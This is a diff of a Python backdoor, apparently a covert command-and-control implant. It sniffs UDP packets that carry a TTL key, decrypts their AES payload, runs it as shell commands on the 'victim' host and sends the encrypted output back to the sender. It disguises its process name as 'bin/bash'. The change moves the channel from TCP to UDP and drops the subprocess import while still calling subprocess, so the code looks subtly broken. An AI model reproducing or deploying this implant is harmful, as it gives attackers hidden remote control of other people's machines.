@@ -1,19 +1,29 @@
 #!/usr/bin/python3
 '''
 setup:
-pip3 install pycrpyto scapy setproctitle
+pip install scapy setproctitle
+pip install pycrypto
 '''
 import sys # Used for exiting the system on errors
 import logging #Dependancy for next import
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy
+#logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Used to supress scapy
 from scapy.all import * #Scapy packet crafting library
 import os # Used for executing commands on shell.
 from AESCipher import AESCipher
 import setproctitle #Used for process masking
 import argparse #used for easy arguments
-import subprocess
 
-def receivedPacket(packet : scapy.packet) -> str:
+
+# Function: receivedPacket()
+# Argument: packet 
+# Purpose: This function gets called on by sniff() meaning if the listening client/victim receives
+#           a packet that is identified as a UDP packet, the sniff stops and goes directly 
+#           to this function. receivedPacket then decrypts this packet via AES (ttlkey). Once
+#           decrypted, will execute the payload by firstly opening up bash shell and then 
+#           execute the commands. Once the commands are executed, the results in the given bash
+#           shell window will then be encypted and encoded into the packet and ready for
+#           tranmission.  
+def receivedPacket(packet):
     """    
     Keyword arguments:
         packet
@@ -28,19 +38,22 @@ def receivedPacket(packet : scapy.packet) -> str:
         if packet[IP].ttl == ttlKey:
             global cipher
             srcIP = packet[IP].src
-            srcPort = packet[TCP].sport
+            srcPort = packet[UDP].sport
             command = cipher.decrypt(packet["Raw"].load)
+            print (command)
             #Execute the command
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read()  + proc.stderr.read()
             if result == "":
                 result = "ERROR or No Output Produced"
-            newPacket = (IP(dst=srcIP, ttl=ttlKey)/TCP(sport=srcPort, dport=srcPort)/cipher.encrypt(result))
-            send(newPacket, verbose = False)
+            encrypted_result = cipher.encrypt(result)
+            newPacket = (IP(dst=srcIP, ttl=ttlKey)/UDP(sport=srcPort, dport=srcPort)/encrypted_result)
+            #send(newPacket, verbose = False)
+            print (result)
+            send(newPacket)
             return True
         else:
             return False
-
 
 #GLOBAL VARIABLES
 ttlKey = 159
@@ -59,6 +72,5 @@ args = arg_parser.parse_args()
 setproctitle.setproctitle("bin/bash")
 
 #Listen for connections
-listening = True
-while listening:
-    sniff(filter='tcp and dst port '+str(args.port), stop_filter=receivedPacket)
+while True:
+    sniff(filter='udp and dst port '+str(args.port), stop_filter=receivedPacket)
